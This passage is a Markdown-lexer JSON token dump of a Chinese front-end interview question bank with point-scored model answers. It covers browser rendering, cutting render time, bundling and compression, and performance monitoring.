优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","text":" 优化字体加载：避免同时加载多个字体文件，选择合适的字体格式和字体加载策略，以提高字体加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","task":false,"loose":false,"text":"**1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","tokens":[{"type":"text","raw":"**1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","text":"**1：** 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","text":" 代码分割和按需加载：对于大型应用，可以将代码按照功能模块进行分割，按需加载，减少首屏加载时的代码量。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 介绍一下浏览器渲染过程\\n\\n","depth":2,"text":"介绍一下浏览器渲染过程","tokens":[{"type":"text","raw":"介绍一下浏览器渲染过程","text":"介绍一下浏览器渲染过程","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **5：** 浏览器的渲染过程主要包括以下几个步骤：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **5：** 浏览器的渲染过程主要包括以下几个步骤：","task":false,"loose":false,"text":"**5：** 浏览器的渲染过程主要包括以下几个步骤：","tokens":[{"type":"text","raw":"**5：** 浏览器的渲染过程主要包括以下几个步骤：","text":"**5：** 浏览器的渲染过程主要包括以下几个步骤：","tokens":[{"type":"strong","raw":"**5：**","text":"5：","tokens":[{"type":"text","raw":"5：","text":"5：","escaped":false}]},{"type":"text","raw":" 浏览器的渲染过程主要包括以下几个步骤：","text":" 浏览器的渲染过程主要包括以下几个步骤：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"blockquote","raw":" >构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n >构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n >合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n >布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n >绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","tokens":[{"type":"paragraph","raw":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","text":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","tokens":[{"type":"text","raw":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。","text":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。","text":"构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。","text":"合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。","text":"布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","text":"绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  ","escaped":false}]}],"text":"构建 DOM 树：浏览器通过解析 HTML 文档构建 DOM（文档对象模型）树，表示页面的结构和内容。  \\n构建 CSSOM 树：浏览器解析 CSS 样式表，构建 CSSOM（CSS 对象模型）树，表示页面的样式信息。  \\n合并 DOM 树和 CSSOM 树：将 DOM 树和 CSSOM 树合并，生成渲染树（Render Tree），其中只包含需要显示的节点和样式信息。  \\n布局（Layout）：根据渲染树计算每个节点在页面中的位置和大小，确定页面的布局。  \\n绘制（Painting）：根据布局信息，将页面内容绘制到屏幕上。  "},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何减少页面渲染时间？\\n\\n","depth":2,"text":"如何减少页面渲染时间？","tokens":[{"type":"text","raw":"如何减少页面渲染时间？","text":"如何减少页面渲染时间？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  \\n- **1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  \\n- **1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  \\n- **1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  \\n- **1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  \\n- **1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  \\n","task":false,"loose":false,"text":"**1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","tokens":[{"type":"text","raw":"**1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","text":"**1：** 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","text":" 减少 DOM 操作：避免频繁的 DOM 操作，可以一次性修改多个 DOM 节点，或者使用文档片段（DocumentFragment）来减少重排和重绘次数。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  \\n","task":false,"loose":false,"text":"**1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","tokens":[{"type":"text","raw":"**1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","text":"**1：** 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","text":" 优化 CSS 样式：避免使用过多复杂的 CSS 选择器，减少样式层级嵌套，以减少 CSSOM 树的构建时间。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  \\n","task":false,"loose":false,"text":"**1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","tokens":[{"type":"text","raw":"**1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","text":"**1：** 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","text":" 合理使用 CSS 动画：避免使用大量复杂的 CSS 动画，尽量使用 CSS3 动画代替 JavaScript 动画，以减少页面重绘次数。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  \\n","task":false,"loose":false,"text":"**1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","tokens":[{"type":"text","raw":"**1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","text":"**1：** 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","text":" 延迟加载资源：将不是必须立即加载的资源（如图片、脚本）延迟加载，以减少页面初次加载时的压力。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  \\n","task":false,"loose":false,"text":"**1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","tokens":[{"type":"text","raw":"**1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","text":"**1：** 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","text":" 使用浏览器缓存：合理设置缓存策略，利用浏览器缓存来减少资源的重复加载，提高页面加载速度。  ","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","task":false,"loose":false,"text":"**1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","tokens":[{"type":"text","raw":"**1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","text":"**1：** 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","text":" 代码优化：优化 JavaScript 代码，减少不必要的计算和操作，避免长时间运行的 JavaScript 代码影响页面渲染性能。","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"heading","raw":"## 如何进行前端代码的打包和压缩，提高页面加载速度？\\n\\n","depth":2,"text":"如何进行前端代码的打包和压缩，提高页面加载速度？","tokens":[{"type":"text","raw":"如何进行前端代码的打包和压缩，提高页面加载速度？","text":"如何进行前端代码的打包和压缩，提高页面加载速度？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。\\n- **1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。\\n- **1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。\\n- **1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。\\n- **1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。\\n- **1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。\\n- **1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。\\n","task":false,"loose":false,"text":"**1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","tokens":[{"type":"text","raw":"**1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","text":"**1：** 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","text":" 使用构建工具：常用的前端构建工具有Webpack、Parcel、Rollup等，它们可以帮助将多个文件打包成一个或多个文件，减少网络请求次数，提高加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。\\n","task":false,"loose":false,"text":"**1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","tokens":[{"type":"text","raw":"**1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","text":"**1：** 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","text":" 代码压缩：使用压缩工具（如UglifyJS、Terser）对 JavaScript、CSS 和 HTML 文件进行压缩，去除空格、注释、无用代码等，减小文件体积，加快加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。\\n","task":false,"loose":false,"text":"**1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","tokens":[{"type":"text","raw":"**1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","text":"**1：** 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","text":" 图片压缩：对图片资源进行压缩处理，可以使用工具（如ImageOptim、TinyPNG）将图片压缩到合适的大小，减小文件体积，提高加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。\\n","task":false,"loose":false,"text":"**1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","tokens":[{"type":"text","raw":"**1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","text":"**1：** 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","text":" 代码分割：按需加载代码，避免一次性加载所有代码，可以使用动态导入（dynamic import）或懒加载（lazy loading）等技术，根据需要加载不同模块，减少首次加载时间。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。\\n","task":false,"loose":false,"text":"**1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","tokens":[{"type":"text","raw":"**1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","text":"**1：** 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","text":" 启用 Gzip 压缩：在服务器端启用 Gzip 压缩，将文件在传输过程中进行压缩，减小文件体积，加快加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。\\n","task":false,"loose":false,"text":"**1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","tokens":[{"type":"text","raw":"**1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","text":"**1：** 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","text":" 缓存策略：合理设置缓存策略，利用浏览器缓存来减少资源重复加载，减少请求次数，提高页面加载速度。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","task":false,"loose":false,"text":"**1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","tokens":[{"type":"text","raw":"**1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","text":"**1：** CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","text":" CDN 加速：将静态资源（如图片、CSS、JavaScript 文件）托管到 CDN（内容分发网络）上，利用 CDN 的分布式节点加速文件传输，提高加载速度。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何实现前端性能监控？\\n\\n","depth":2,"text":"如何实现前端性能监控？","tokens":[{"type":"text","raw":"如何实现前端性能监控？","text":"如何实现前端性能监控？","escaped":false}]},{"type":"heading","raw":"#### 类型：`中级`\\n\\n","depth":4,"text":"类型：`中级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`中级`","text":"中级"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。\\n- **1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。\\n- **1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。\\n- **1：** 监控用户行为：通过监控用户行为，了解用户在网站上的操作和反馈，及时优化网站性能和用户体验。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。\\n","task":false,"loose":false,"text":"**1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","tokens":[{"type":"text","raw":"**1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","text":"**1：** 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","text":" 性能监控工具：使用性能监控工具（如Google Lighthouse、WebPageTest、GTmetrix）对网站进行性能评估，了解网站的加载速度、性能指标和问题点。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。\\n","task":false,"loose":false,"text":"**1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","tokens":[{"type":"text","raw":"**1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","text":"**1：** 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","text":" 前端监控工具：使用前端监控工具（如Sentry、New Relic、Datadog）监控网站的前端错误、性能指标和用户行为，及时发现并解决问题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。\\n","task":false,"loose":false,"text":"**1：** 性能指标：关注关键性能指标，如首次内容绘制（FCP）、可交互时间（TTI）、总体布局位移（CLS）等，优化这些指标可以提升用户体验。","tokens":[{"type":"text","raw":"**1：** 